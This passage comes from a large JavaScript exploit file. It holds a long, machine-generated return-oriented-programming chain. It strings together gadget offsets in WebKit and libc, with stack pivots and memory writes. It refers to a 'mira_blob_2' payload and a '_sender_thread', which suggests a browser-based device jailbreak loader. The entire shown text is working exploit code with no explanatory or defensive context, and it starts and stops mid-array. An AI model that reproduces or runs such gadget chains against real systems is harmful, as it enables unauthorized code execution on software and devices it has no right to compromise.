libc_base+362222, //pop rsi
ropchain+166944, //L2568-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L2568:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+167048, //L2569-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+167080, //L2571-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+167064, //L2570-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2569:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2570:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2571:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+167240, //L2575-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+167192, //L2572-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+167224, //L2574-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2572:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2573:
db([48, 0]); // 0x30
set_gadget(libc_base+155394,); //pop rdi
//L2574:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2575:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+167344, //L2577-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+167328, //L2576-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2576:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2577:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L2578:
db([8, 0]); // 0x8
set_gadget(libc_base+467092,); //pop rax
//L2579:
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+167552, //L2582-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+167520, //L2580-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2580:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2581:
db([48, 0]); // 0x30
set_gadget(libc_base+467092,); //pop rax
//L2582:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+167656, //L2584-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+167640, //L2583-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2583:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2584:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+167752, //L2587-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2585:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L2587:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+167856, //L2590-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+167840, //L2589-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2589:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2590:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224576, //mov ax, [rdi]
libc_base+362222, //pop rsi
ropchain+168016, //L2594-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+167968, //L2591-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+168000, //L2593-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2591:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2592:
db([16, 0]); // 0x10
set_gadget(libc_base+155394,); //pop rdi
//L2593:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2594:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+168072, //L2596-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L2596:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+168176, //L2597-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+168208, //L2599-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+168192, //L2598-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2597:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2598:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2599:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+168368, //L2603-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+168320, //L2600-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+168352, //L2602-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2600:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2601:
db([48, 0]); // 0x30
set_gadget(libc_base+155394,); //pop rdi
//L2602:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2603:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+168472, //L2605-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+168456, //L2604-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2604:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2605:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L2606:
db([8, 0]); // 0x8
set_gadget(libc_base+467092,); //pop rax
//L2607:
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+168672, //L2610-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+168640, //L2608-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2608:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2609:
db([32, 0]); // 0x20
set_gadget(libc_base+467092,); //pop rax
//L2610:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+168776, //L2612-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+168760, //L2611-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2611:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2612:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+168888, //L2615-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+168856, //L2613-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2613:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2614:
db([48, 0]); // 0x30
set_gadget(libc_base+467092,); //pop rax
//L2615:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+168952, //L2616-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+757614 //pop rcx
]);
//L2616:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+169008, //L2619-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2619:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+85173, //or rax, rcx
libc_base+362222, //pop rsi
ropchain+169152, //L2621-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+169168, //L2622-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+169136, //L2620-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2620:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2621:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2622:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+169328, //L2626-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+169280, //L2623-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+169312, //L2625-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2623:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2624:
db([48, 0]); // 0x30
set_gadget(libc_base+155394,); //pop rdi
//L2625:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2626:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+169440, //L2627-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+169472, //L2629-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+169456, //L2628-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2627:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2628:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2629:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+169568, //L2630-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+169584, //L2631-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2630:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2631:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+169696, //L2632-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+169680, //L2633-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2633:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2632:
db([0, 0]); // 0x0
set_gadgets([
libc_base+362222, //pop rsi
ropchain+169784, //L2635-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+169768, //L2634-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2634:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2635:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+169880, //L2636-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+169896, //L2637-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2636:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2637:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+170008, //L2638-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+169992, //L2639-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2639:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2638:
db([0, 0]); // 0x0
//_sender_thread:
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+170080, //L2640-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L2640:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+170144, //L2642-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L2642:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967248, 4294967295]); // -0x30
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2644:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+757614, //pop rcx
//L2646:
(window.mira_blob_2||0),
libc_base+499086, //add rax, rsi
webkit_base+7880191, //mov [rax], rcx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2647:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+757614, //pop rcx
//L2649:
(window.mira_blob_2_len||0),
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2650:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+170408, //L2654-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+170392, //L2653-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2653:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2654:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+170568, //L2658-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+170536, //L2656-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+170552, //L2657-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L2655:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2656:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2657:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2658:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+227029, //movzx eax, al
libc_base+362222, //pop rsi
ropchain+170696, //L2660-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+170712, //L2661-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+170680, //L2659-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2659:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2660:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2661:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+170816, //L2663-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+170864, //L2666-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+170848, //L2665-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2663:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2664:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2665:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2666:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+362222, //pop rsi
ropchain+170992, //L2667+8
libc_base+499086, //add rax, rsi
libc_base+751703, //mov rax, [rax]
libc_base+362222, //pop rsi
ropchain+170968, //L2667-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+766440 //pop rsp
]);
//L2667:
db([0, 0]); // 0x0
set_gadgets([
ropchain+171008, //L2667+24
ropchain+171312, //L2662
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+171048, //L2669-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2668:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2669:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2670:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+171160, //L2671-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+171176, //L2672-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L2671:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2672:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+171288, //L2673-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+171272, //L2674-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2674:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L2673:
db([0, 0]); // 0x0
//L2662:
set_gadget(libc_base+467092,); //pop rax
//L2675:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L2677:
ropchain+213568, //L2676
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L2679:
ropchain+171472, //L2678
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+183328, //L2680
//L2678:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([16, 0]); // 0x10
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+171544, //L2682-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2681:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2682:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L2683:
db([1, 0]); // 0x1
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L2684:
db([2, 0]); // 0x2
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L2686:
ropchain+171760, //L2685
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+181664, //L2687
//L2685:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+171832, //L2690-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2688:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+757614,); //pop rcx
//L2690:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
//L2692:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+171936, //L2694-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L2693:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L2694:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
//L2696:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+172032, //L2698-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L2697:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L2698:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+172104, //L2700-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L2699:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L2700:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+172176, //L2702-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L2701:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L2702:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+172248, //L2704-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L2703:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L2704:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+172320, //L2706-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L2705:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L2706:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+172392, //L2708-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L2707:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L2708:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+172464, //L2710-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L2709:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L2710:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+362222, //pop rsi
ropchain+172536, //L2712-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L2711:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L2712:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2713:
db([4294967265, 4294967295]); // -0x1f
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+172632, //L2716-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2715:
db([2, 0]); // 0x2
set_gadget(libc_base+467092,); //pop rax
//L2716:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+490911, //mov [rax], cl
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2717:
db([4294967266, 4294967295]); // -0x1e
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+172736, //L2721-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
//L2720:
db([15651, 0]); // 0x3d23
set_gadget(libc_base+155394,); //pop rdi
//L2721:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+5166499, //mov [rdi], cx
libc_base+362222, //pop rsi
ropchain+172808, //L2724-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2722:
db([4294967268, 4294967295]); // -0x1c
set_gadget(libc_base+155394,); //pop rdi
//L2724:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+172872, //L2726-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
